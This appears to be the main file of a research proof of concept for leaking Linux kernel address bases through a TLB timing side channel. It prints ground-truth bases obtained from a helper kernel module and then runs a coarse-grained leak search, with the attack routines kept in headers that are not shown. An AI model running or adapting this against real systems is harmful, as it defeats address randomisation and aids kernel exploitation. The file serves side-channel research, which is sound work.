#include "coarse_grain_leak.h"
#include "ulkm.h"

#define TRIES 30

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    init_tlb_flush();
    pin_to_core(0);

    /* warmup */
    size_t dpm_base = 0;
    size_t vmemmap_base = 0;
    size_t vmalloc_base = 0;
    lkm_init();
    lkm_dpm_leak((size_t)&dpm_base);
    lkm_vmemmap_leak((size_t)&vmemmap_base);
    lkm_vmalloc_base_leak((size_t)&vmalloc_base);
    printf("[*] dpm_base     %016zx\n", dpm_base);
    printf("[*] vmemmap_base %016zx\n", vmemmap_base);
    printf("[*] vmalloc_base %016zx\n", vmalloc_base);

    for (volatile size_t i = 0; i < (1ULL << 30); ++i);
    /* leaking */
    search_all_coarse_grains(TRIES);
}